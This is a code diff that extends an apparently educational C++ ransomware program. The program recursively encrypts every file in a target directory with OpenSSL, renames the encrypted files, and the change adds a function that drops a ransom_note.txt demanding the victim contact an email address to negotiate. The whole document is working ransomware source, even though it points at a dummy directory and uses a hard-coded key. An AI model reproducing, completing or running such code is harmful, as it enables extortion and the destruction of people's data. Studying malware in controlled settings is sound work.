@@ -10,17 +10,19 @@
 using recursive_directory_iterator = std::filesystem::recursive_directory_iterator;
 
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename);
+void leaveNote(std::string target_dir, const char* message);
 
 int main(){
 
-    std::filesystem::path myPath = "dummy_directory_1";
+    std::string target_dir = "dummy_directory_2";
+    std::filesystem::path myPath = target_dir;
     std::string file;
 
     unsigned char key_chars[] = "Hard-coded key here.";
     unsigned char iv[] = "some random IV value";
 
     for (const auto& dirEntry : recursive_directory_iterator(myPath)){
-        
+
         if (!dirEntry.is_directory()){
 
             file = dirEntry.path().generic_string();
@@ -32,6 +34,8 @@ int main(){
             std::filesystem::rename(oldName, newName);
         }
     }
+    const char* ransom_message = "Harharhar! You've been hit by ransomware! Contact this email to negotiate: not_a_hacker@gmail.com.";
+    leaveNote(target_dir, ransom_message);
 }
 
 void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* filename){
@@ -58,4 +62,12 @@ void encryptFile(unsigned char key_chars[], unsigned char iv[], const char* file
     }
     EVP_CIPHER_CTX_free(ctx);
     fclose(file_ptr);
+}
+
+void leaveNote(std::string target_dir, const char* message){
+    std::string ransom_note_file = target_dir + "/ransom_note.txt";
+    FILE* notePtr = fopen(ransom_note_file.c_str(), "w");
+    fprintf(notePtr, "%s", message);
+    fclose(notePtr);
+    printf("Done leaving note.\n");
 }
